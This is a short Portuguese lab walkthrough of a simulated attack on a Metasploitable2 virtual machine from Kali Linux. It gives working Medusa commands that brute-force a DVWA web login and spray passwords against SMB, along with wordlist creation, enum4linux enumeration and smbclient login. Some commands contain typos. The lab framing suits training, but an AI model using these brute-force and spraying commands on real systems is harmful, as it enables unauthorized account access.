# Simulação de Ataque Cibernético

Começe seu ataque no terminal (CLI) no Kali Linux com o seguinte comando em um arquivo de texto:
---
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
---
---
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
---
# Utilize um site para achar usuários e senhas sem segurança

---
medusa -h IP (de ataque) -U users.txt -P pass.txt - M http \
-m PAGE: '/dwa/Login.php' \
-m FROM: 'usrname=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' t 6
---
https://imgur.com/kiHFgUk

# Outros arquivos de texto para senhas sem segurança
---
enum4linux -a IP (de ataque) | tee enum4_output.txt
---
https://imgur.com/5vfnoTn

---
less enum4_output.txt
---
https://imgur.com/XTqX68h

https://imgur.com/5ccTKs4

https://imgur.com/W3K7r8J

https://imgur.com/b0AYyKn

# Digite esses para mais usuários e senhas sem segurança para clientes samba

---
echo -e "user\nmsfadmin\nservice" > smb_users.txt
---
---
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
---

# Ataque com Medusa
---
medusa -h IP(de ataque) -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
---
Resposta: ACCOUNT FOUND -> encontrou

https://imgur.com/qT0CfVC
# Login e senha de cliente samba
---
smbclient -L IP(de ataque) -U msfadmin
---

https://imgur.com/l82FSJf


|Os exercícios foram feitos no VirtualBox com a imagem Kali Linux
e Metasploitable2|

[VirtualBox](https://www.virtualbox.org/)
[Kali Linux](https://www.kali.org/docs/introduction/download-official-kali-linux-images/)
[Metasploitable2](https://sourceforge.net/projects/metasploitable2/)
|O atacante é o Kali Linux que penetra na Rede do Metasploitable2
pelo IP do Metasploitable2|
